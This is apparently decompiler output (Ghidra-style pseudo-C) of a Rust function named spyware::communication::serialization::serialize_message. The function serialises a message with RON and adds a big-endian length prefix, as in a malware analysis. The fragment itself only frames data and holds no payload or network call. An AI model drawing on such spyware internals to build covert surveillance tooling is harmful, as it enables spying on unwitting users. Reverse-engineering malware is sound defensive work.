undefined4 *
_ZN7spyware13communication13serialization17serialize_message17hd905e118d95099f9E
          (undefined4 *param_1,undefined8 param_2)

{
  code *pcVar1;
  undefined8 uVar2;
  undefined4 local_ac;
  undefined local_a8 [16];
  undefined8 uStack_98;
  uint uStack_90;
  undefined4 uStack_8c;
  undefined4 local_88;
  undefined4 uStack_84;
  undefined4 uStack_80;
  undefined4 uStack_7c;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  uint local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined4 local_48;
  undefined4 uStack_44;
  uint uStack_40;
  undefined4 uStack_3c;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  
                    /* try { // try from 001580c3 to 001580cc has its CatchHandler @ 001581d7 */
  _ZN3ron3ser9to_string17h9734e6b78e2f568fE(local_a8);
  if (local_a8._0_4_ == 0x21) {
    local_78 = local_a8._8_4_;
    uStack_74 = local_a8._12_4_;
    uStack_70 = (undefined4)uStack_98;
    uStack_6c = uStack_98._4_4_;
                    /* try { // try from 001580f0 to 001580f4 has its CatchHandler @ 001581d2 */
    local_a8 = _ZN5alloc7raw_vec20RawVecInner_LT_A_GT_16with_capacity_in17h590fc4c98277c4adE
                         (CONCAT44(uStack_8c,uStack_90) + 4);
    uStack_98 = 0;
    local_ac = 0;
    uVar2 = _ZN106__LT_core__ops__range__Range_LT_usize_GT__u20_as_u20_core__slice__index__SliceIndex_LT__u5b_T_u5d__GT__GT_9index_mut17h7e5c0b070607da95E
                      (&local_ac);
    local_58 = uStack_90 >> 0x18 | (uStack_90 & 0xff0000) >> 8 | (uStack_90 & 0xff00) << 8 |
               uStack_90 << 0x18;
                    /* try { // try from 00158125 to 00158179 has its CatchHandler @ 001581dc */
    _ZN4core5slice29__LT_impl_u20__u5b_T_u5d__GT_15copy_from_slice17h6585e5c92fa374d1E
              (uVar2,4,&local_58,4,&PTR_DAT_001b9df8);
    _ZN3std2io5impls74__LT_impl_u20_std__io__Write_u20_for_u20_alloc__vec__Vec_LT_u8_C_A_GT__GT_9write_all17hab29cafd5801f495E
              (local_a8,&local_ac);
    _ZN90__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17hcfccc9d078fd7c1dE
              (&local_58,&local_78);
    _ZN136__LT_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_alloc__vec__spec_extend__SpecExtend_LT_T_C_alloc__vec__into_iter__IntoIter_LT_T_GT__GT__GT_11spec_extend17hbce3591083c8b697E
              (local_a8,&local_58,&PTR_DAT_001b9e10);
    *(undefined8 *)(param_1 + 4) = uStack_98;
    *param_1 = local_a8._0_4_;
    param_1[1] = local_a8._4_4_;
    param_1[2] = local_a8._8_4_;
    param_1[3] = local_a8._12_4_;
    _ZN4core3ptr62drop_in_place_LT_spyware__communication__messages__Message_GT_17hdefc99125fc89861E
              (param_2);
    return param_1;
  }
  local_38 = local_88;
  uStack_34 = uStack_84;
  uStack_30 = uStack_80;
  uStack_2c = uStack_7c;
  local_48 = (undefined4)uStack_98;
  uStack_44 = uStack_98._4_4_;
  uStack_40 = uStack_90;
  uStack_3c = uStack_8c;
  local_58 = local_a8._0_4_;
  uStack_54 = local_a8._4_4_;
  uStack_50 = local_a8._8_4_;
  uStack_4c = local_a8._12_4_;
                    /* try { // try from 001581c6 to 001581cf has its CatchHandler @ 001581d7 */
  _ZN7spyware13communication13serialization17serialize_message28__u7b__u7b_closure_u7d__u7d_17h5049c5cf23312933E
            (&local_58);
                    /* WARNING: Does not return */
  pcVar1 = (code *)invalidInstructionException();
  (*pcVar1)();
}